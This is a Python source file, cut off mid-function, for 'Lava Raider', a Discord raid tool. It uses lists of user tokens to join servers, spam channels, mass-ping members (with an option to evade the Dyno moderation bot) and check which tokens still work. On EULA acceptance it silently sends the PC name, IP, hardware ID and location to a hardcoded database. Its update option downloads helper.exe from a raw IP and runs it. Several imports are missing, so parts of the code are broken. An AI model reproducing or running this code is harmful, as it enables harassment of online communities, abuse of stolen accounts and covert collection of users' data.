import os
import tkinter as tk
from tkinter import messagebox
from pystyle import Write, Colors, Center, Colorate
from os import system, name
import ctypes
import httpx as requests 
import random
import urllib3 
import base64
import time
import json
import mysql.connector
from mysql.connector import Error
import customtkinter
import threading
import io
import sys
from contextlib import redirect_stdout
import platform
import socket
import hwid
import re
import subprocess
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAVA_VERSION = '2.0.0'

is_windows = False

if platform.system() == 'Windows':
    is_windows = True
# Check if files exist
if not os.path.exists("proxies.txt"):
    with open('proxies.txt', "w") as f:
        pass  # Create the file with an empty content

if not os.path.exists("tokens.txt"):
    with open('tokens.txt', "w") as f:
        pass  # Create the file with an empty content
def insert_eula_data(pc_name=None, ip=None, hwid=None, geo=None):
    try:
        connection = mysql.connector.connect(
            host='185.197.74.254',
            database='lava_eula',
            user='lava_user',
            password='udvEuXbWOqTiKMHyOLZCDpfVGJf261VhwEHfZhav30nVd20TY1'
        )

        if connection.is_connected():
            cursor = connection.cursor()
            sql_insert_query = """
            INSERT INTO data (PC_Name, IP, HWID, Geo)
            VALUES (%s, %s, %s, %s)
            """
            data = (pc_name, ip, hwid, geo)
            cursor.execute(sql_insert_query, data)
            connection.commit()
            print("Data inserted successfully")

    except Error as e:
        print(f"Error: {e}")

    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()
            print("MySQL connection is closed")

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

if not os.path.exists('tokens.txt'):
    with open('tokens.txt', 'w') as file:
        pass  # Create the file if it doesn't exist

with open('tokens.txt', 'r') as file:
    lines = [line.strip() for line in file.readlines()]
    token_count = len(lines)
    tokens = lines

if not os.path.exists('proxies.txt'):
    with open('proxies.txt', 'w') as file:
        pass  # Create the file if it doesn't exist

with open('proxies.txt', 'r') as file:
    proxies = file.read().splitlines()
    proxy_count = len(proxies)

if is_windows:
    # Windows-specific code
    ctypes.windll.kernel32.SetConsoleTitleW(f"Lava Raider | Tokens Loaded: {token_count} | Proxies Loaded: {proxy_count} | Developed by AndrexYT")
else:
    print(f"Lava Raider | Tokens Loaded: {token_count} | Proxies Loaded: {proxy_count} | Developed by AndrexYT")

title = """
@@@        @@@@@@   @@@  @@@   @@@@@@   
@@@       @@@@@@@@  @@@  @@@  @@@@@@@@  
@@!       @@!  @@@  @@!  @@@  @@!  @@@  
!@!       !@!  @!@  !@!  @!@  !@!  @!@  
@!!       @!@!@!@!  @!@  !@!  @!@!@!@!  
!!!       !!!@!!!!  !@!  !!!  !!!@!!!!  
!!:       !!:  !!!  :!:  !!:  !!:  !!!  
 :!:      :!:  !:!   ::!!:!   :!:  !:!  
 :: ::::  ::   :::    ::::    ::   :::  
: :: : :   :   : :     :       :   : :  
"""

def Style(text):
    return Colorate.Horizontal(Colors.yellow_to_red, text, 1)

def CenterText(text):
    return Center.XCenter(text)

clear()
title = CenterText(title)
title = Style(title)

menu1 = f"""
01 Join Server       06 Add Emoji           11 Respond Spam
02 Leave Server      07 Soundboard Spam     12 Mass DM
03 Spam Channel      08 Join Voicechat      13 Mass Edit Tokens
04 Massping Users    09 Click Button        14 Get token info
05 Check Tokens      10 Thread Spam         15 Proxy Checker
16 Greetings spam    17 Mass Online
"""

menu1 = CenterText(menu1)

for i in range(1, 18):
    menu1 = menu1.replace(f'{i:02d}', Style(f'{i:02d}'))

if os.path.isfile('eula') == False:
    file = open("eula","w")
    file.write("False")
    file.close()

file = open("eula","r")
eula = file.read()
file.close()

if is_windows:
    if eula == 'False':
        def fetch_eula_text():
            try:
                response = requests.get('https://raw.githubusercontent.com/FuckYouDark/LavaEula/main/eula.txt')
                response.raise_for_status()
                return response.text
            except requests.RequestException as e:
                messagebox.showerror("Error", f"Failed to fetch EULA content: {e}")
                return "Failed to load content."

        def gui():
            try:
                def decline():
                    file = open("eula","w")
                    file.write("False")
                    file.close()
                    sys.exit()

                def accept():
                    file = open("eula","w")
                    file.write("True")
                    file.close()
                    ip = requests.get('https://api64.ipify.org?format=json').json()['ip']
                    insert_eula_data(pc_name=str(socket.gethostname()), ip=str(ip), hwid=str(hwid.get_hwid()), geo=str(requests.get(f'https://ipinfo.io/{ip}/geo').json()))
                    sys.exit()

                def on_closing():
                    print("Window is closing")
                    app.destroy()
                    
                app = customtkinter.CTk()
                app.title("Eula Agreement")
                app.attributes('-alpha', 0.8)

                window_width = 400
                window_height = 400
                screen_width = app.winfo_screenwidth()
                screen_height = app.winfo_screenheight()
                x = (screen_width // 2) - (window_width // 2)
                y = (screen_height // 2) - (window_height // 2)
                app.geometry(f"{window_width}x{window_height}+{x}+{y}")

                text_label = customtkinter.CTkTextbox(app, font=("Arial", 16), text_color="#FFA500")
                text_label.pack(pady=20, padx=20, expand=True, fill='both')
                text_label.insert("1.0", fetch_eula_text())

                button_frame = customtkinter.CTkFrame(app)
                button_frame.pack(pady=40)

                decline_button = customtkinter.CTkButton(button_frame, text="Decline", command=decline)
                decline_button.pack(side="left", padx=10)

                accept_button = customtkinter.CTkButton(button_frame, text="Accept", command=accept)
                accept_button.pack(side="left", padx=10)

                app.protocol("WM_DELETE_WINDOW", on_closing)

                app.mainloop()

            except Exception as e:
                print(f"An error occurred: {e}")
                messagebox.showerror("Error", f"An unexpected error occurred: {e}")

        def thread_function():
            with io.StringIO() as buf, redirect_stdout(buf):
                gui()

        # Create and start the thread
        thread = threading.Thread(target=thread_function)
        thread.start()

        # Wait for the thread to finish
        thread.join()
else:
    if eula == 'False':
        try:
            agree = input(Style('Do you agree with EULA [t.ly/ESdtL] [Y/N]') + ' >> ')
        except EOFError:
            sys.exit(0)
        if 'yes' in agree.lower() or agree.lower() == 'y':
            file = open("eula","w")
            file.write("True")
            file.close()
            ip = requests.get('https://api64.ipify.org?format=json').json()['ip']
            insert_eula_data(pc_name=str(socket.gethostname()), ip=str(ip), hwid=str(hwid.get_hwid()), geo=str(requests.get(f'https://ipinfo.io/{ip}/geo').json()))

file = open("eula","r")
eula = file.read()
file.close()

if eula != "True":
    sys.exit()

WORKER_URL = 'http://lavapi.hackysoft.xyz:8000/key'

key_pattern = re.compile(r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$')

if not os.path.exists('key') or open("key").read() == '':
    with open('key', 'w') as file:
        print(title+'\n')
        license_key = None
        key_invalid = True
        while key_invalid:
            key = input(Style('License key') + ' >> ')
            if not key_pattern.match(key):
                print(Style('Incorrect key >:('))
            else:
                data = {'key': key, 'hwid': hwid.get_hwid()}  # The license key or request body you want to check
                headers = {
                    'Content-Type': 'application/json',  # Set Content-Type to application/json
                    'User-Agent': 'LavaRaider',
                    'LavaVersion': LAVA_VERSION  # Replace with actual LavaVersion if needed
                }
                response = requests.post(WORKER_URL, data=json.dumps(data), headers=headers) # {"valid":true}
                if response.json().get("valid") == True:
                    print(Style('Success! >:3'))
                    key_invalid = False
                    license_key = key
                    file.write(license_key)
                    file.close()
                else:
                    if response.json().get("error") == "HWID is invalid":
                        print(Style('Invalid HWID! Please use on same device as it was bought for.'))
                        sys.exit(0)
                    else:
                        print(Style('Invalid key! >:('))
        clear()

with open('key', 'r') as file:
    license_key = file.read()
    data = {'key': license_key, 'hwid': hwid.get_hwid()}  # The license key or request body you want to check
    headers = {
        'Content-Type': 'application/json',  # Set Content-Type to application/json
        'User-Agent': 'LavaRaider',
        'LavaVersion': LAVA_VERSION   # Replace with actual LavaVersion if needed
    }
    response = requests.post(WORKER_URL, data=json.dumps(data), headers=headers) # {"valid":true}
    if response.json().get("valid") == True:
        pass
    else:
        print(Style('Key has expired or HWID has changed!'))
        license_key = None
        key_invalid = True
        while key_invalid:
            key = input(Style('License key') + ' >> ')
            if not key_pattern.match(key):
                print(Style('Incorrect key >:('))
            else:
                data = {'key': key, 'hwid': hwid.get_hwid()}  # The license key or request body you want to check
                headers = {
                    'Content-Type': 'application/json',  # Set Content-Type to application/json
                    'User-Agent': 'LavaRaider',
                    'LavaVersion': LAVA_VERSION  # Replace with actual LavaVersion if needed
                }
                response = requests.post(WORKER_URL, data=json.dumps(data), headers=headers) # {"valid":true}
                if response.json().get("valid") == True:
                    print(Style('Success! >:3'))
                    key_invalid = False
                    license_key = key
                else:
                    if response.json().get("error") == "HWID is invalid":
                        print(Style('Invalid HWID! Please use on same device as it was bought for.'))
                        sys.exit(0)
                    else:
                        print(Style('Invalid key! >:('))

        with open('key', 'w') as file:
            file.write(license_key)
        clear()


print(title)
print(menu1)

updateobj = requests.get('http://lavapi.hackysoft.xyz:8000/versions')
newest_version = max(updateobj.json()["versions"], key=lambda v: list(map(int, v.split('.'))))

if LAVA_VERSION != newest_version:
    print(Style(CenterText(f'Update {newest_version} is available, type update to update.')))

while True:
    try:
        choice = input(f'\n' + Style('Your choice') + ' >> ')
        if choice != int and choice.lower() == 'update':
            break
        else:
            choice = int(choice)
            if 1 <= choice <= 15:
                break
            else:
                print('Invalid choice. Please enter a number between 1 and 15.')
    except ValueError:
        print('Invalid input. Please enter a number.')

def calculateNonce(date="now"):
    if date == "now":
        unixts = time.time()
    else:
        import datetime
        unixts = time.mktime(date.timetuple())
    return str((int(unixts)*1000-1420070400000)*4194304)

if choice.lower() == 'update':
    helper = urllib.request.urlretrieve('http://185.197.74.254:8000/versions/helper.exe', 'helper.exe')
    subprocess.Popen(['helper.exe'], shell=True)
    sys.exit(1)
elif choice == '01' or choice == '1':
    clear()
    print(title)
    invite_code = input(Style('Invite Code') + ' >> ')
    guild_id = input(Style('Guild id') + ' >> ')
    channel_id = input(Style('Invite channel id') + ' >> ')
    delay = input(Style('Delay') + ' >> ')
    if len(proxies) > 0:
        print("Proxies found!")
        for token, proxy in zip(tokens, proxies):
            print(f"{token} with {proxy}")
    else:
        print("No proxies :p")
        for token in tokens:
            print(token)
            xproperties = "{" + f'"location":"Accept Invite Page","location_guild_id":{guild_id},"location_channel_id":{channel_id},"location_channel_type":0' + "}"
            xproperties = xproperties.encode('utf-8')
            headers = {
                'accept': '*/*',
                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                'authorization': token,
                'content-type': 'application/json',
                'cookie': f'locale=en-US; discordUserToken={token}',
                'dnt': '1',
                'origin': 'https://discord.com',
                'referer': f'https://discord.com/invite/{invite_code}',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-context-properties': base64.b64encode(xproperties),
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
            }
            reqobj = requests.post(f'https://discord.com/api/v9/invites/{invite_code}',headers=headers,json={"session_id":None})
            print(reqobj.status_code)
            print(reqobj.text)
            if reqobj.status_code == 200:
                print('Successully joined!')

            elif reqobj.status_code == 401:
                print('Invalid token')

            elif reqobj.status_code == 403:
                print('Locked token')
            time.sleep(delay)

if choice == '02' or choice == '2':
    clear()
    print(title)
    guild_id = input(Style('Guild id') + ' >> ')
    if len(proxies) > 0:
        print("Proxies found!")
        for token, proxy in zip(tokens, proxies):
            print(f"{token} with {proxy}")
    else:
        print("No proxies :p")
        for token in tokens:
            headers = {'authorization': token}
            reqobj = requests.delete(f'https://discord.com/api/v10/users/@me/guilds/{guild_id}',headers=headers)
            print(reqobj.status_code)
            print(reqobj.text)
            if reqobj.status_code == 204:
                print('Successully left!')
            elif reqobj.status_code == 401:
                print('Invalid token')

            elif reqobj.status_code == 403:
                print('Locked token')

if choice == '03' or choice == '3': # POST  https://discord.com/api/v9/channels/1253404769188581428/messages  {"mobile_network_type": "unknown","content": "ff","nonce": "1254168933750013952","tts": false,"flags": 0}
    clear()
    print(title)
    guild_id = input(Style('Guild id') + ' >> ')
    chnl_id = input(Style('Channel id') + ' >> ')
    text = input(Style('Text') + ' >> ')
    tts = input(Style('Text to speech [Y/N]') + ' >> ')
    delay = int(input(Style('Delay') + ' >> '))
    if tts.lower() == "y" or tts.lower() == "yes":
        tts = True
    else:
        tts = False
    if len(proxies) > 0:
        print("Proxies found!")
        for token, proxy in zip(tokens, proxies):
            print(f"{token} with {proxy}")
    else:
        print("No proxies :p")
        while True:
            for token in tokens:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                    'authorization': token,
                    'content-type': 'application/json',
                    'cookie': f'locale=en-US; discordUserToken={token}',
                    'dnt': '1',
                    'origin': 'https://discord.com',
                    'referer': f'https://discord.com/channels/{guild_id}/{chnl_id}',
                    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                    'x-debug-options': 'bugReporterEnabled',
                    'x-discord-locale': 'en-US',
                    'x-discord-timezone': 'Europe/Budapest',
                    'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
                }
                reqobj = requests.post(f'https://discord.com/api/v9/channels/{chnl_id}/messages',headers=headers, json={"mobile_network_type": "unknown","content": text,"nonce": None,"tts": tts,"flags": 0})
                print(reqobj.status_code)
                print(reqobj.text)
                print(token)
                if reqobj.status_code == 204:
                    print('Spamming!!!')
                elif reqobj.status_code == 401:
                    print('Invalid token')
                elif reqobj.status_code == 403:
                    print('Locked token')
                time.sleep(delay)

if choice == '04' or choice == '4':
    clear()
    print(title)
    guild_id = input(Style('Guild id') + ' >> ')
    chnl_id = input(Style('Channel id') + ' >> ')
    text = input(Style('Text') + ' >> ')
    tts = input(Style('Text to speech [Y/N]') + ' >> ')
    dyno_bypass = input(Style('Escape Dyno [Y/N]') + ' >> ')
    delay = int(input(Style('Delay') + ' >> '))
    if tts.lower() == "y" or tts.lower() == "yes":
        tts = True
    else:
        tts = False

    if dyno_bypass.lower() == "y" or dyno_bypass.lower() == "yes":
        dyno_bypass = True
    else:
        dyno_bypass = False

    unique_author_ids = set()

    for token in tokens:
        headers = {
                'accept': '*/*',
                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                'authorization': token,
                'content-type': 'application/json',
                'cookie': f'locale=en-US; discordUserToken={token}',
                'dnt': '1',
                'origin': 'https://discord.com',
                'referer': f'https://discord.com/channels/{guild_id}/{chnl_id}',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
        }
        messages = requests.get(f'https://discord.com/api/v9/channels/{chnl_id}/messages?limit=100', headers=headers)
        if messages.status_code == 200:
            messages_data = messages.json()

            # Process each message in the response
            for entry in messages_data:
                author_id = entry['author']['id']
                unique_author_ids.add(author_id)
        else:
            print(f"Failed to retrieve messages. Status code: {messages.status_code} - {messages.text}")

    if dyno_bypass == False:
        while True:
            for author in list(unique_author_ids):
                headers = {
                        'accept': '*/*',
                        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                        'authorization': token,
                        'content-type': 'application/json',
                        'cookie': f'locale=en-US; discordUserToken={token}',
                        'dnt': '1',
                        'origin': 'https://discord.com',
                        'referer': f'https://discord.com/channels/{guild_id}/{chnl_id}',
                        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                        'x-debug-options': 'bugReporterEnabled',
                        'x-discord-locale': 'en-US',
                        'x-discord-timezone': 'Europe/Budapest',
                        'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
                }
                reqobj = requests.post(f'https://discord.com/api/v9/channels/{chnl_id}/messages',headers=headers, json={"mobile_network_type": "unknown","content": f"||<@{author}>||\n" + text,"nonce": None,"tts": tts,"flags": 0})
                if reqobj.status_code == 204:
                    print('Spamming!!!')
                elif reqobj.status_code == 401:
                    print('Invalid token')
                elif reqobj.status_code == 403:
                    print('Locked token')
                time.sleep(delay)
    else:
        while True:
            for author in list(unique_author_ids):
                headers = {
                        'accept': '*/*',
                        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                        'authorization': token,
                        'content-type': 'application/json',
                        'cookie': f'locale=en-US; discordUserToken={token}',
                        'dnt': '1',
                        'origin': 'https://discord.com',
                        'referer': f'https://discord.com/channels/{guild_id}/{chnl_id}',
                        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'sec-gpc': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                        'x-debug-options': 'bugReporterEnabled',
                        'x-discord-locale': 'en-US',
                        'x-discord-timezone': 'Europe/Budapest',
                        'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
                }
                reqobj = requests.post(f'https://discord.com/api/v9/channels/{chnl_id}/messages',headers=headers, json={"mobile_network_type": "unknown","content": f"||{''.join(random.choices(string.ascii_uppercase + string.digits, k=5))} " + f"<@{author}>||\n" + text + f" ||{''.join(random.choices(string.ascii_uppercase + string.digits, k=32))}||","nonce": None,"tts": tts,"flags": 0})
                if reqobj.status_code == 204:
                    print('Spamming!!!')
                elif reqobj.status_code == 401:
                    print('Invalid token')
                elif reqobj.status_code == 403:
                    print('Locked token')
                time.sleep(delay + random.uniform(1,5))

if choice == '05' or choice == '5':
    clear()
    print(title)
    working_list = []
    locked_list = []
    if len(proxies) > 0:
        print("Proxies found!")
        for token in tokens:
            proxy = random.choice(proxies)
            headers = {'Authorization': token}
            try:
                reqobj = requests.get('https://discord.com/api/v10/users/@me', headers=headers, proxies={'https': proxy}, verify=False)
                if reqobj.status_code == 200:
                    print(f"{Colors.green}[✓] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} is valid!', 1))
                    working_list.append(token)
                elif reqobj.status_code == 401 or reqobj.status_code == 403:
                    print(f"{Colors.red}[✗] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} is locked!', 1))
                    locked_list.append(token)
                else:
                    print(f"{Colors.red}[✗] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} returned unexpected status code: {reqobj.status_code}', 1))
            except Exception as e:
                print(f"{Colors.red}[✗] " + Colorate.Horizontal(Colors.yellow_to_red, f'Error occurred while processing {token}: {e}', 1))
    else:
        print("No proxies :p")
        for token in tokens:
            headers = {'Authorization': token}
            reqobj = requests.get('https://discord.com/api/v10/users/@me',headers=headers, verify=False)
            #{"id":"1210127720126881814","username":"nexus0596","avatar":"831597146f55f68d3ed7a1b77395c9b4","discriminator":"0","public_flags":0,"premium_type":2,"flags":0,"banner":null,"accent_color":8442661,"global_name":"AndrexYT/alt","avatar_decoration_data":null,"banner_color":"#80d325","mfa_enabled":true,"locale":"en-US","email":"2b2tnexusstore@gmail.com","verified":true,"phone":null,"nsfw_allowed":true,"premium_usage_flags":0,"linked_users":[],"purchased_flags":2,"bio":"","authenticator_types":[2]}
            if reqobj.status_code == 200:
                print(f"{Colors.green}[✓] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} is valid!', 1))
                working_list.append(token)

            elif reqobj.status_code == 401:
                print(f"{Colors.red}[✗] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} is locked!', 1))
                locked_list.append(token)

            elif reqobj.status_code == 403:
                print(f"{Colors.red}[✗] " + Colorate.Horizontal(Colors.yellow_to_red, f'{token} is locked!', 1))
                locked_list.append(token)

    with open('valid.txt', 'w') as file:
        for value in working_list:
            file.write(str(value) + '\n')

    with open('locked.txt', 'w') as file:
        for value in locked_list:
            file.write(str(value) + '\n')

if choice == '06' or choice == '6':
    clear()
    print(title)
    guild_id = input(Style('Guild id') + ' >> ')
    chnl_id = input(Style('Channel id') + ' >> ')
    message_id = input(Style('Message id') + ' >> ')
    emoji = input(Style('Emoji [🐍]') + ' >> ')
    delay = int(input(Style('Delay') + ' >> '))
    if len(proxies) > 0:
        print("Proxies found!")
        for token, proxy in zip(tokens, proxies):
            print(f"{token} with {proxy}")
    else:
        print("No proxies :p")
        for token in tokens:
            headers = {
                'accept': '*/*',
                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                'authorization': token,
                'content-type': 'application/json',
                'cookie': f'locale=en-US; discordUserToken={token}',
                'dnt': '1',
                'origin': 'https://discord.com',
                'referer': f'https://discord.com/channels/{guild_id}/{chnl_id}',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
            }
            url = f'https://discord.com/api/v10/channels/{chnl_id}/messages/{message_id}/reactions/{emoji}/@me'
            response = requests.put(url, headers=headers)
            if response.status_code == 204:
                print(f'Reaction {emoji} added successfully to message {message_id}.')
            else:
                print(f'Failed to add reaction. Status code: {response.status_code}')
                print(response.text)  # Print error message if any
            time.sleep(delay)

if choice == '07' or choice == '7':
    clear()
    print(title)
    guild_id = input(Style('Guild id') + ' >> ')
    chnl_id = input(Style('Channel id') + ' >> ')
    message_id = input(Style('Message id') + ' >> ')
    emoji = input(Style('Emoji [🐍]') + ' >> ')
    delay = int(input(Style('Delay') + ' >> '))
    if len(proxies) > 0:
        print("Proxies found!")
        for token, proxy in zip(tokens, proxies):
            print(f"{token} with {proxy}")
    else:
        print("No proxies :p")
        for token in tokens:
            headers = {
                'accept': '*/*',
                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                'authorization': token,
                'content-type': 'application/json',
                'cookie': f'locale=en-US; discordUserToken={token}',
                'dnt': '1',
                'origin': 'https://discord.com',
                'referer': f'https://discord.com/channels/{guild_id}/{chnl_id}',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
            }
            url = f'https://discord.com/api/v10/channels/{chnl_id}/messages/{message_id}/reactions/{emoji}/@me'
            response = requests.put(url, headers=headers)
            if response.status_code == 204:
                print(f'Reaction {emoji} added successfully to message {message_id}.')
            else:
                print(f'Failed to add reaction. Status code: {response.status_code}')
                print(response.text)  # Print error message if any
            time.sleep(delay)

if choice == '8' or choice == '08':
    print("No proxies :p")
    status = input(Style('Status [online/dnd/idle]') + ' >> ')
    if status != 'online' and status != 'dnd' and status != 'idle':
        status = 'online'

    GUILD_ID = 1260942685330604042
    CHANNEL_ID = 1260942685330604046
    SELF_MUTE = True
    SELF_DEAF = True

    async def on_message(message):
        global heartbeat_interval
        payload = json.loads(message)
        if payload.get('op') == 10:  # OpCode 10 signifies a hello payload
            heartbeat_interval = payload['d']['heartbeat_interval'] / 1000
            heartbeat_task = asyncio.create_task(heartbeat())
            print("HeartBeat sent!")
        elif payload.get('op') == 11:  # OpCode 11 signifies a heartbeat ACK
            pass
        else:
            pass  # Handle other message types as needed

    async def heartbeat():
        global heartbeat_interval, websocket
        while True:
            await asyncio.sleep(heartbeat_interval)
            if websocket:
                await websocket.send(json.dumps({'op': 1, 'd': None}))
                print("HeartBeat sent!")

    async def on_open(websocket, usertoken):
        auth = {
            "op": 2,
            "d": {
                "token": usertoken,
                "properties": {
                    "$os": "Windows 10",
                    "$browser": "Google Chrome",
                    "$device": "Windows"
                },
                "presence": {
                    "status": status,
                    "afk": False
                }
            }
        }
        vc = {
            "op": 4,
            "d": {
                "guild_id": GUILD_ID,
                "channel_id": CHANNEL_ID,
                "self_mute": SELF_MUTE,
                "self_deaf": SELF_DEAF
            }
        }
        await websocket.send(json.dumps(auth))
        await websocket.send(json.dumps(vc))

    async def run_joiner(usertoken):
        global websocket
        uri = 'wss://gateway.discord.gg/?v=9&encoding=json'
        async with websockets.connect(uri, max_size=None) as ws:
            websocket = ws  # Assign the websocket instance
            await on_open(websocket, usertoken)
            async for message in websocket:
                await on_message(message)

    async def start_bot(usertoken):
        validate = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers={"Authorization": usertoken})
        if validate.status_code != 200:
            print(f"[ERROR] Token {usertoken} might be invalid. Please check it again.")
            return

        userinfo = validate.json()
        username = userinfo["username"]
        discriminator = userinfo["discriminator"]
        userid = userinfo["id"]

        print(f"Logged in as {username}#{discriminator} ({userid}).")
        await run_joiner(usertoken)

    async def run_multiple_instances(tokens):
        tasks = []
        for token in tokens:
            tasks.append(asyncio.create_task(start_bot(token)))
        await asyncio.gather(*tasks)

    asyncio.run(run_multiple_instances(tokens))

if choice == '9' or choice == '09':
    session_ids = {}
    print("No proxies :p")
    guild_id = input(Style('Guild id') + ' >> ')
    channel_id = input(Style('Channel id') + ' >> ')
    application_id = input(Style('Application id [bot id]') + ' >> ')
    message_id = input(Style('Message id') + ' >> ')
    custom_id = input(Style('Button id [via Network tab]') + ' >> ')
    status = 'online'

    async def on_message(message, usertoken):
        global heartbeat_interval
        payload = json.loads(message)

        if payload.get('op') == 10:  # OpCode 10 signifies a hello payload
            heartbeat_interval = payload['d']['heartbeat_interval'] / 1000
            asyncio.create_task(heartbeat())  # Start the heartbeat task
            print("HeartBeat sent!")
        elif payload.get('op') == 11:  # OpCode 11 signifies a heartbeat ACK
            pass
        elif payload.get('t') == 'SESSIONS_REPLACE':
            session_id = payload['d'][0]['session_id']
            session_ids[usertoken] = session_id
            print(f"Session ID for token {usertoken}: {session_id}")
            payload = {
              "type": 3,
              "nonce": calculateNonce(),
              "guild_id": guild_id,
              "channel_id": channel_id,
              "message_flags": 0,
              "message_id": message_id,
              "application_id": application_id,
              "session_id": session_id,
              "data": {
                "component_type": 2,
                "custom_id": custom_id
              }
            }

            print(payload)

            # Headers for the POST request
            headers = {
                'accept': '*/*',
                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
                'authorization': usertoken,
                'content-type': 'application/json',
                'cookie': f'locale=en-US; discordUserToken={usertoken}',
                'dnt': '1',
                'origin': 'https://discord.com',
                'referer': f'https://discord.com/channels/{guild_id}/{channel_id}/',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'x-debug-options': 'bugReporterEnabled',
                'x-discord-locale': 'en-US',
                'x-discord-timezone': 'Europe/Budapest',
                'x-super-properties': base64.b64encode(b'{"os": "Windows","client_build_number": 310927}')
            }

